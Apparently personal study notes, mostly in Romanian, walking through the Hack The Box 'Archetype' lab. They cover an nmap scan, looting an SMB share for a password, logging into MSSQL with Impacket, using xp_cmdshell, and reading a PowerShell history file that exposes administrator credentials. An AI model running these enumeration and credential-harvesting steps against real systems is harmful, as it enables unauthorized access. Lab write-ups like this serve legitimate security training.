1. Which TCP port is hosting a database server?
Cu un scan cu instrumentul [[Tools/nmap]] verificam care porturi sunt deschise si care sunt inchisi si o sa putem raspunde la prima intrebare.
```bash
sudo nmap -sVC -T4 -p- <IP> -oN archetype_scan
```
![[Pasted image 20230907155446.png]]
Raspunsul este `1433`
Aici este atasat scanarea de la [[Tools/nmap]] 
![[archetype_nmap_scan]]
2. What is the name of the non-Administrative share available over SMB?
Trebuie sa vedem care directori sunt disponibile in sistemul nostru acesta poate rezolvata cu instrumentul [[smbclient]] si cu flagul `-L` care trebuie sa ne returneze o lista de directoare.
```bash
smbclient -L <IP>
```
![[Pasted image 20230907155830.png]]
Raspunsul este `backups`
3. What is the password identified in the file on the SMB share?
Acum avem nevoie sa ne conectam la directoriul care a fost gasit de noi anterior acesta poate fii executat prin comanda:
```bash
smbclient "\\\\<IP>\backups"
```
![[Pasted image 20230907161406.png]]
Dupa ce am suntem in folderul care lam gasit putem vedea ce este in directoriul `backups`
cu un singur [[ls]] care este si in linux ne va arata continutul directoriului in care suntem.
Vedem ca avem un fisier care are denumirea de `prod.disConfig`.
Dar cum sa vedem ce este in fisierul dat. Trebuie sa fie descarca la noi pe masina si deja o sa putem vedea care este continutul acestuea. Cu comanda `get prod.disConfig` descarcam fisierul dat. 
![[Pasted image 20230907162224.png]]
Raspunsul la intrebare este `M3g4c0rp123`
4. What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
![[Pasted image 20230907163638.png]]
Raspunsul la intrebare este `mssqlclient.py`
5. What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
Pentru a raspunde la intrebarea data trebuie sa ne conectam la mssql cu ajutorul sriptului care lam gasit pe git ne va ajuta comanda [[curl]]
```bash
curl -O https://raw.githubusercontent.com/fortra/impacket/master/examples/mssqlclient.py
```
Rulam scriptul pentru a ne conecta:
```bash
python3 mssqlclient.py sql_svc:M3g4c0rp123@10.129.28.201 -windows-auth
```
Unde:
`sql_svc` - Username
`M3g4c0rp123` - Password
`10.129.28.201` - IP
Acum putem face un help pe serverul nostru pentru a vedea comenzile care ne pot fii utile.
![[Pasted image 20230907171349.png]]
Raspunsul la intrebarea este `xp_cmdshell`
6. What script can be used in order to search possible paths to escalate privileges on Windows hosts?




PS C:\Users\sql_svc\Downloads> Get-Content C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
Get-Content C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!  
exit

Finisul 
